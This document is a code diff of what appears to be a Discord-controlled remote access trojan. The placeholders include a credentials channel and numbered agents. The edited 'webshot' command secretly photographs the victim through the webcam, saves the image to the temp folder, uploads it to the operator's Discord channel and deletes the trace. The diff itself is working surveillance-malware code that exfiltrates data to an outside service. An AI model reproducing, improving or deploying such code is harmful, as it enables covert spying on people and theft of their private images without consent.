@@ -30,7 +30,6 @@ SCREENSHOTS_ID = {SCREENSHOTS_ID}
 DOWNLOADS_ID = {DOWNLOADS_ID}
 AGENT_ONLINE_ID = {AGENT_ONLINE_ID}
 CREDENTIALS_ID = {CREDENTIALS_ID}
-
 USER_PROFILE = os.environ["USERPROFILE"]
 
 client = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_command=None)
@@ -274,15 +273,12 @@ async def webshot(context):
         try:
             cam = VideoCapture(0)
             ret, frame = cam.read()
-
             current_time = datetime.now()
-            path = "{}/Webcam{}{}{}.png".format(USER_PROFILE, current_time.year, current_time.month, current_time.day)
-
+            path = os.environ["temp"] +"\\p.png"
             imwrite(path, frame)
-
-            await channel.send(f"**Agent #{ID}** | Webcam snapshot {path}", file=discord.File(path))
+            await channel.send(f"**Agent #{ID}** | Webcam snapshot `{now.strftime('%d/%m/%Y %H:%M:%S')}`", file=discord.File(path))
             os.remove(path)
-            my_embed = discord.Embed(title=f"Got webcam snapshot from Agent#{ID}", color=0x00F00)
+            my_embed = discord.Embed(title=f"Got webcam snapshot from Agent#{ID}", color=0x00FF00)
             await context.message.channel.send(embed=my_embed)
         except Exception as e:
             my_embed = discord.Embed(title=f"Error while taking webcam snapshot from Agent#{ID}:\n{e}", color=0xFF0000)
